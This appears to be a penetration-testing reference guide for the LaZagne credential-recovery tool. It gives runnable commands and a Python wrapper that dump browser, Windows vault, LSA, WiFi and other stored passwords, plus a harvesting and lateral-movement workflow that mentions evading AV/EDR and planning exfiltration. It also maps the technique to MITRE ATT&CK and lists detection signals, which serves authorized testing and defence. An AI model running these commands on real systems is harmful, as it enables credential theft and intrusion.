# Performing Credential Access With Lazagne

## API Reference

## Libraries Used

| Library | Purpose |
|---------|---------|
| `subprocess` | Execute LaZagne CLI for credential recovery testing |
| `json` | Parse LaZagne JSON output |
| `pathlib` | Handle output file paths |
| `os` | Check platform and privilege level |

## Installation

```bash
# Python (from source)
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Windows
pip install -r requirements.txt
python laZagne.py --help

# Linux
pip install -r requirements.txt
python laZagne.py --help

# Pre-compiled Windows binary
# Download from GitHub Releases
```

## CLI Reference

### Retrieve All Credentials
```bash
# All modules, JSON output
python laZagne.py all -oJ

# All modules, text output to file
python laZagne.py all -oA -output /tmp/lazagne_results

# Run with elevated privileges (recommended for full results)
# Windows: Run as Administrator
# Linux: sudo python laZagne.py all
```

### Module-Specific Scans
```bash
# Browser credentials only
python laZagne.py browsers

# WiFi passwords
python laZagne.py wifi

# Database credentials
python laZagne.py databases

# System credentials (Windows)
python laZagne.py windows

# Email client credentials
python laZagne.py mails

# Git credentials
python laZagne.py git
```

### Key CLI Flags

| Flag | Description |
|------|-------------|
| `all` | Run all credential recovery modules |
| `browsers` | Chrome, Firefox, Edge, Opera, IE passwords |
| `wifi` | Saved WiFi network passwords |
| `databases` | Database client saved credentials |
| `windows` | Windows credential manager, vault, LSA |
| `mails` | Email client saved passwords |
| `git` | Git credential store and helpers |
| `sysadmin` | Admin tools (PuTTY, WinSCP, FileZilla) |
| `-oJ` | Output as JSON |
| `-oA` | Output all formats (JSON + TXT) |
| `-output` | Output directory path |
| `-password` | Master password for specific modules |
| `-v` | Verbose output |

## Available Modules

### Windows Modules
| Module | Targets |
|--------|---------|
| `chrome` | Chrome saved passwords and cookies |
| `firefox` | Firefox logins.json |
| `edge` | Edge Chromium saved passwords |
| `ie` | Internet Explorer saved credentials |
| `credman` | Windows Credential Manager |
| `vault` | Windows Vault |
| `lsa_secrets` | LSA Secrets (requires SYSTEM) |
| `cachedump` | Domain cached credentials |
| `winscp` | WinSCP session passwords |
| `putty` | PuTTY saved sessions |
| `filezilla` | FileZilla saved servers |
| `wifi` | Saved WiFi profiles |

### Linux Modules
| Module | Targets |
|--------|---------|
| `chrome` | Chrome/Chromium saved passwords |
| `firefox` | Firefox saved passwords |
| `kde` | KDE Wallet credentials |
| `gnome` | GNOME Keyring |
| `wifi` | NetworkManager WiFi passwords |
| `docker` | Docker config.json |
| `ssh` | SSH private keys (detection only) |
| `git` | Git credential store |
| `env` | Environment variable secrets |

## Python Integration

### Run LaZagne and Parse Results
```python
import subprocess
import json
import os
from pathlib import Path

def run_lazagne(modules="all", output_dir="/tmp/lazagne"):
    """Run LaZagne and parse JSON output for credential audit."""
    os.makedirs(output_dir, exist_ok=True)
    cmd = ["python", "laZagne.py", modules, "-oJ", "-output", output_dir]

    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=120,
    )

    # Find the JSON output file
    json_files = list(Path(output_dir).glob("*.json"))
    if json_files:
        with open(json_files[0]) as f:
            return json.load(f)
    return []
```

### Categorize Findings by Risk
```python
HIGH_RISK_MODULES = {"lsa_secrets", "cachedump", "credman", "vault", "wifi"}
MEDIUM_RISK_MODULES = {"chrome", "firefox", "edge", "putty", "winscp", "filezilla"}

def categorize_credentials(lazagne_output):
    summary = {"high": [], "medium": [], "low": [], "total": 0}
    for module_result in lazagne_output:
        module_name = list(module_result.keys())[0]
        creds = module_result[module_name]
        if not creds:
            continue
        for cred in creds:
            entry = {"module": module_name, **cred}
            if module_name in HIGH_RISK_MODULES:
                summary["high"].append(entry)
            elif module_name in MEDIUM_RISK_MODULES:
                summary["medium"].append(entry)
            else:
                summary["low"].append(entry)
            summary["total"] += 1
    return summary
```

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Credentials from Password Stores | T1555 | Browser, credential manager |
| Credentials from Web Browsers | T1555.003 | Chrome, Firefox, Edge |
| Windows Credential Manager | T1555.004 | Credential Manager, Vault |
| Cached Domain Credentials | T1003.005 | Domain cached logon |
| LSA Secrets | T1003.004 | LSA secret extraction |

## Output Format

```json
[
  {
    "chrome": [
      {
        "URL": "https://internal.example.com/login",
        "Login": "admin@example.com",
        "Password": "REDACTED"
      }
    ]
  },
  {
    "wifi": [
      {
        "SSID": "CorpWiFi-5G",
        "Password": "REDACTED",
        "Authentication": "WPA2-Personal"
      }
    ]
  },
  {
    "credman": [
      {
        "Target": "TERMSRV/prod-server-01",
        "Username": "DOMAIN\\admin",
        "Password": "REDACTED"
      }
    ]
  }
]
```

---

## Standards and Controls

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|-------------|------|--------|
| T1555 | Credentials from Password Stores | Credential Access |
| T1555.003 | Credentials from Web Browsers | Credential Access |
| T1555.004 | Windows Credential Manager | Credential Access |
| T1552.001 | Credentials In Files | Credential Access |
| T1552.002 | Credentials in Registry | Credential Access |
| T1003.004 | LSA Secrets | Credential Access |
| T1539 | Steal Web Session Cookie | Credential Access |

## MITRE ATT&CK Software Entry

- LaZagne: S0349 (https://attack.mitre.org/software/S0349/)

## Official Resources

- LaZagne GitHub: https://github.com/AlessandroZ/LaZagne
- Atomic Red Team T1555: https://atomicredteam.io/credential-access/T1555/
- MITRE T1555: https://attack.mitre.org/techniques/T1555/

## Detection References

- Windows Event 5379: Credential Manager credentials were read
- DPAPI CryptUnprotectData monitoring
- Chrome Login Data file access monitoring

---

## Workflows

## Credential Harvesting Workflow

```
1. Pre-Execution
   ├── Verify access level (standard user vs. admin/SYSTEM)
   ├── Check AV/EDR status on target
   ├── Prepare output directory for results
   └── Plan exfiltration method for credential data

2. Execution
   ├── Run lazagne.exe all -oJ for full extraction
   ├── Run specific modules if full scan is too noisy
   ├── Elevate to SYSTEM if needed for DPAPI/LSA
   └── Collect output files

3. Analysis
   ├── Parse JSON output
   ├── Deduplicate credentials
   ├── Categorize by source (browser, email, system, etc.)
   └── Prioritize by value (domain creds > local > web)

4. Validation
   ├── Test domain credentials with CrackMapExec
   ├── Verify cloud credentials (AWS CLI, Azure CLI)
   ├── Check VPN/remote access credentials
   └── Map credentials to BloodHound attack paths

5. Lateral Movement
   ├── Use validated credentials for next hop
   ├── Repeat credential harvesting on new targets
   └── Document credential chain for report
```

## Module Execution Priority

```
High Priority (run first):
  browsers    → Web application credentials, SSO tokens
  windows     → Domain cached credentials, DPAPI
  sysadmin    → SSH keys, RDP credentials, PuTTY

Medium Priority:
  databases   → Database connection strings
  mails       → Email credentials for BEC
  git         → Source code repository access

Low Priority:
  wifi        → Network access but limited value
  chat        → Communication platform access
  svn         → Legacy source control
```

---

## Working Template

## Engagement Details

| Field | Value |
|-------|-------|
| Host Name | |
| Host IP | |
| User Context | Standard / Admin / SYSTEM |
| OS | |
| Collection Date | |

## Credential Summary

| Category | Count | Priority |
|----------|-------|----------|
| Domain Credentials | | Critical |
| Cloud Credentials | | High |
| Remote Access | | High |
| Database | | Medium |
| Email | | Medium |
| Web/Browser | | Low |
| Other | | Info |

## Lateral Movement Opportunities

| Credential | Target System | Access Type | Validated |
|-----------|--------------|-------------|-----------|
| | | SMB / RDP / SSH | Yes / No |

## Evidence Handling

- [ ] Credentials stored in encrypted container
- [ ] Access limited to authorized team members
- [ ] Credentials will be purged after engagement
- [ ] Client notified of credential exposure scope
